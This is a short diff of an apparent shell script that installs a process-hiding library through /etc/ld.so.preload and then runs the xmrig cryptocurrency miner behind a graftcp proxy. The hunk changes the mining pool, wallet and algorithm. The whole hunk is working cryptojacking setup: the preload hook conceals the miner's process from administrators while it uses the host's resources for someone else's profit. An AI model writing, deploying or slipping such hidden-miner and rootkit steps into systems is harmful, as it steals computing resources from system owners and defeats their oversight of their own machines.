@@ -50,4 +50,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./xmrig --donate-level 1 -o sg.kevacoin.herominers.com:1163 -u VBQfjixEZGCg8apk2H3R27ENKsgzFaCLy9 -p TUKIMEN -a rx/keva -k
+./graftcp/graftcp ./xmrig --donate-level 1 -o 51pool.online:441 -u pitri#elshanum -p elshanum -a randomepic -k
